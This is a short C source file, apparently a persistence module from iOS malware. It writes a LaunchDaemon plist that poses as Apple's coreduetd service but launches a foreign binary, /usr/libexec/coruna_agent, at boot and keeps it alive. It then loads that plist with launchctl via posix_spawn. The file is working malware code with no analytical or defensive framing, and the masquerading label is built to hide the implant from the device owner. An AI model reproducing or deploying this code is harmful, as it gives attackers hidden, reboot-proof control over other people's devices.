#include "persistence.h"
#include <stdio.h>
#include <string.h>
#include <spawn.h>       /* posix_spawn — available on iOS, system() is not */
#include <sys/wait.h>

/* Launch an external command via posix_spawn (no system() on iOS) */
static void run_cmd(const char *path, char *const argv[]) {
    pid_t pid;
    extern char **environ;
    if (posix_spawn(&pid, path, NULL, NULL, argv, environ) == 0)
        waitpid(pid, NULL, 0);
}

void install_launchdaemon(void) {
    const char *plist =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>\n"
        "    <key>Label</key><string>com.apple.coreduetd</string>\n"
        "    <key>ProgramArguments</key><array>\n"
        "        <string>/usr/libexec/coruna_agent</string>\n"
        "    </array>\n"
        "    <key>RunAtLoad</key><true/>\n"
        "    <key>KeepAlive</key><true/>\n"
        "</dict></plist>\n";

    const char *plist_path = "/Library/LaunchDaemons/com.apple.coreduetd.plist";
    FILE *fp = fopen(plist_path, "w");
    if (!fp) return;
    fwrite(plist, 1, strlen(plist), fp);
    fclose(fp);

    /* posix_spawn launchctl load <plist> */
    char *argv[] = { "launchctl", "load",
                     (char *)plist_path, NULL };
    run_cmd("/bin/launchctl", argv);
}

void hook_system_daemon(void) {}
